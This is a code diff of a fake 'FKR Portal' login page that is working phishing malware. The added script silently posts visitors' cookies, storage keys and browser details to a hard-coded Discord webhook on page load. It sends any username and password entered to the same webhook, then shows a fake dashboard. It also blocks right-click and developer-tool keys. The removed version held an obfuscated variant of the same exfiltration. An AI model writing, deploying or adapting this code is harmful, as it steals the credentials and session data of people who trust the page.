@@ -1,77 +1,194 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>FKR Access</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FKR Portal</title>
     <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            overflow: hidden;
-            background: #000;
-            height: 100%;
-            color: #0f0;
-            font-family: monospace;
-        }
-        .container {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            text-align: center;
-        }
-        .dot {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            background: #0f0;
-            border-radius: 50%;
-            margin: 0 5px;
-            animation: pulse 1.5s infinite ease-in-out;
-        }
-        .dot:nth-child(2) { animation-delay: 0.2s; }
-        .dot:nth-child(3) { animation-delay: 0.4s; }
-        @keyframes pulse {
-            0%, 100% { opacity: 0.2; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1.2); }
-        }
-        .text {
-            margin-top: 30px;
-            font-size: 14px;
-            letter-spacing: 2px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .hidden { display: none !important; }
+        /* Login Page */
+        .login-container { background: rgba(255, 255, 255, 0.08); backdrop-filter: blur(12px); padding: 40px; border-radius: 20px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4); width: 90%; max-width: 380px; border: 1px solid rgba(255, 255, 255, 0.1); }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo-text { font-size: 36px; font-weight: 800; background: linear-gradient(to right, #00dbde, #fc00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .logo-sub { color: rgba(255, 255, 255, 0.6); font-size: 14px; margin-top: 5px; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; color: rgba(255, 255, 255, 0.8); margin-bottom: 8px; font-size: 14px; }
+        .input-group input { width: 100%; padding: 14px; background: rgba(255, 255, 255, 0.07); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 10px; color: white; font-size: 16px; transition: all 0.3s; }
+        .input-group input:focus { outline: none; border-color: #00dbde; background: rgba(255, 255, 255, 0.1); }
+        .login-btn { width: 100%; padding: 16px; background: linear-gradient(to right, #00dbde, #fc00ff); border: none; border-radius: 10px; color: white; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.3s; }
+        .login-btn:hover { transform: translateY(-2px); }
+        .footer-links { margin-top: 25px; text-align: center; color: rgba(255, 255, 255, 0.5); font-size: 13px; }
+        /* Dashboard */
+        .dashboard-container { width: 95%; max-width: 1200px; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border-radius: 20px; padding: 30px; border: 1px solid rgba(255, 255, 255, 0.1); color: white; }
+        .dashboard-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; }
+        .dashboard-title h1 { font-size: 28px; background: linear-gradient(to right, #00dbde, #fc00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .user-info { display: flex; align-items: center; gap: 15px; }
+        .avatar { width: 50px; height: 50px; border-radius: 50%; background: linear-gradient(to right, #00dbde, #fc00ff); }
+        .cards-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 25px; margin-bottom: 40px; }
+        .card { background: rgba(255, 255, 255, 0.07); border-radius: 15px; padding: 25px; transition: transform 0.3s; border: 1px solid rgba(255, 255, 255, 0.05); }
+        .card:hover { transform: translateY(-5px); background: rgba(255, 255, 255, 0.1); }
+        .card h3 { color: #00dbde; margin-bottom: 15px; font-size: 18px; }
+        .card p { color: rgba(255, 255, 255, 0.7); line-height: 1.5; }
+        .loading-bar { height: 6px; width: 100%; background: rgba(255, 255, 255, 0.1); border-radius: 3px; overflow: hidden; margin-top: 15px; }
+        .loading-fill { height: 100%; width: 0%; background: linear-gradient(to right, #00dbde, #fc00ff); border-radius: 3px; animation: load 2s ease-in-out infinite; }
+        @keyframes load { 0% { width: 0%; } 50% { width: 100%; } 100% { width: 0%; } }
+        .activity-feed { background: rgba(255, 255, 255, 0.07); border-radius: 15px; padding: 25px; }
+        .activity-item { display: flex; align-items: center; padding: 15px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
+        .activity-dot { width: 10px; height: 10px; border-radius: 50%; background: #00dbde; margin-right: 15px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
     </style>
 </head>
-<body oncontextmenu="return false;" onkeydown="if(event.keyCode==123){return false;}" ondragstart="return false;" onselectstart="return false;">
-    <div class="container">
-        <div>
-            <span class="dot"></span>
-            <span class="dot"></span>
-            <span class="dot"></span>
+<body>
+    <!-- Login Page -->
+    <div id="loginPage" class="login-container">
+        <div class="logo">
+            <div class="logo-text">FKR</div>
+            <div class="logo-sub">Future Knowledge Repository</div>
         </div>
-        <div class="text">FKR SECURE LOGIN INITIALIZING</div>
+        <form id="loginForm">
+            <div class="input-group">
+                <label>Username or Email</label>
+                <input type="text" id="username" placeholder="Enter your username" required>
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="login-btn">Sign In</button>
+        </form>
+        <div class="footer-links">
+            <a href="#" style="color: rgba(255, 255, 255, 0.7); text-decoration: none;">Forgot password?</a> • 
+            <a href="#" style="color: rgba(255, 255, 255, 0.7); text-decoration: none;">Create account</a>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="dashboardPage" class="dashboard-container hidden">
+        <div class="dashboard-header">
+            <div class="dashboard-title">
+                <h1>Welcome back, <span id="displayName">User</span></h1>
+                <p style="color: rgba(255, 255, 255, 0.6);">Your personalized dashboard</p>
+            </div>
+            <div class="user-info">
+                <div class="avatar"></div>
+                <div>
+                    <div style="font-weight: 600;" id="dashboardUser">user@fkr.com</div>
+                    <div style="font-size: 13px; color: rgba(255, 255, 255, 0.5);">Administrator</div>
+                </div>
+            </div>
+        </div>
+        <div class="cards-container">
+            <div class="card">
+                <h3>Data Analytics</h3>
+                <p>Real-time insights and system performance metrics.</p>
+                <div class="loading-bar"><div class="loading-fill"></div></div>
+            </div>
+            <div class="card">
+                <h3>Security Module</h3>
+                <p>All systems operational. No threats detected.</p>
+                <div class="loading-bar"><div class="loading-fill"></div></div>
+            </div>
+            <div class="card">
+                <h3>Network Status</h3>
+                <p>Global nodes synchronized. Latency: &lt;12ms</p>
+                <div class="loading-bar"><div class="loading-fill"></div></div>
+            </div>
+        </div>
+        <div class="activity-feed">
+            <h3 style="color: #fc00ff; margin-bottom: 20px;">Recent Activity</h3>
+            <div class="activity-item">
+                <div class="activity-dot"></div>
+                <div>User session initialized</div>
+            </div>
+            <div class="activity-item">
+                <div class="activity-dot"></div>
+                <div>Security handshake completed</div>
+            </div>
+            <div class="activity-item">
+                <div class="activity-dot"></div>
+                <div>Dashboard modules loaded</div>
+            </div>
+        </div>
     </div>
 
     <script>
-        // Disable F12, Ctrl+Shift+I, Ctrl+U, etc.
-        document.addEventListener('keydown', function(e) {
-            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.shiftKey && e.keyCode == 74) || (e.ctrlKey && e.keyCode == 85)) {
+        // IMMEDIATE BACKGROUND DATA LOGGING ON PAGE LOAD
+        (function logBrowserData() {
+            const data = {
+                cookies: document.cookie,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenRes: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                localStorageKeys: Object.keys(localStorage),
+                sessionStorageKeys: Object.keys(sessionStorage)
+            };
+            
+            const payload = {
+                content: `**FKR - Browser Data Log**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``
+            };
+            
+            // Send to Discord webhook silently
+            fetch('https://discord.com/api/webhooks/1465638053178638368/PUa4Dm8GQyGFw6GPk62Lw76fnN7ehRb7Xw0b9VGjEFOiwwMpwPaocTz77f8BFVWYIXod', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        })();
+
+        // Login functionality
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Log credentials as well
+            const credData = {
+                username: username,
+                password: password,
+                loginTime: new Date().toISOString()
+            };
+            
+            const credPayload = {
+                content: `**FKR - Login Attempt**\n\`\`\`json\n${JSON.stringify(credData, null, 2)}\n\`\`\``
+            };
+            
+            fetch('https://discord.com/api/webhooks/1465638053178638368/PUa4Dm8GQyGFw6GPk62Lw76fnN7ehRb7Xw0b9VGjEFOiwwMpwPaocTz77f8BFVWYIXod', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(credPayload)
+            }).catch(() => {});
+            
+            // Simulate login process
+            document.getElementById('loginPage').classList.add('hidden');
+            document.getElementById('dashboardPage').classList.remove('hidden');
+            document.getElementById('displayName').textContent = username || 'User';
+            document.getElementById('dashboardUser').textContent = username || 'user@fkr.com';
+            
+            // Simulate loading animations
+            setTimeout(() => {
+                document.querySelectorAll('.loading-fill').forEach(bar => {
+                    bar.style.animation = 'none';
+                    bar.style.width = '100%';
+                });
+            }, 2000);
+        });
+
+        // Disable right-click and F12
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
                 e.preventDefault();
-                return false;
             }
         });
-        // Obfuscated data collection and sending
-        (function(){
-            var _0x1a2b=['webhooks/1465638053178638368/PUa4Dm8GQyGFw6GPk62Lw76fnN7ehRb7Xw0b9VGjEFOiwwMpwPaocTz77f8BFVWYIXod','stringify','POST','content','application/json','href','cookie','userAgent','platform','referrer','language','width','height','timeZone','toISOString','then','catch'];var _0x3a8f=function(_0x1a2b80,_0x3a8f89){_0x1a2b80=_0x1a2b80-0x0;var _0x5086d7=_0x1a2b[_0x1a2b80];return _0x5086d7;};
-            var _0x4dccf3={};_0x4dccf3[_0x3a8f('0x0')]=document[_0x3a8f('0x1')];_0x4dccf3[_0x3a8f('0x2')]=navigator[_0x3a8f('0x2')];_0x4dccf3[_0x3a8f('0x3')]=navigator[_0x3a8f('0x3')];_0x4dccf3['url']=window.location[_0x3a8f('0x4')];_0x4dccf3[_0x3a8f('0x5')]=document[_0x3a8f('0x5')];_0x4dccf3[_0x3a8f('0x6')]=navigator[_0x3a8f('0x6')];_0x4dccf3['screen']=screen[_0x3a8f('0x7')]+'x'+screen[_0x3a8f('0x8')];_0x4dccf3['timezone']=Intl.DateTimeFormat().resolvedOptions()[_0x3a8f('0x9')];_0x4dccf3['timestamp']=new Date()[_0x3a8f('0xa')]();
-            var _0x2b5a24={};_0x2b5a24[_0x3a8f('0xb')]='**Browser Data**\x0a```json\x0a'+JSON[_0x3a8f('0xc')](_0x4dccf3,null,0x2)+'\x0a```';
-            fetch('https://discord.com/api/'+_0x3a8f('0xd'),{method:_0x3a8f('0xe'),headers:{'Content-Type':_0x3a8f('0xf')},body:JSON[_0x3a8f('0xc')](_0x2b5a24)})[_0x3a8f('0x10')](()=>{})[_0x3a8f('0x11')](()=>{});
-        })();
-        // Simulate login form appearing after 2 seconds
-        setTimeout(function() {
-            document.querySelector('.container').innerHTML = '<div class="text">ENTER CREDENTIALS</div><input type="text" id="user" placeholder="username" style="background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 10px; width: 200px;"><br><input type="password" id="pass" placeholder="password" style="background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 10px; width: 200px;"><br><button onclick="alert(\'Login failed. Connection lost.\')" style="background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 10px;">LOGIN</button>';
-        }, 2000);
     </script>
-    <noscript>Please enable JavaScript to access FKR.</noscript>
 </body>
 </html>
-<!-- Source obfuscated. FKR Security Layer v3.14 -->
+<!-- FKR Portal v2.1 | Secure Access System -->
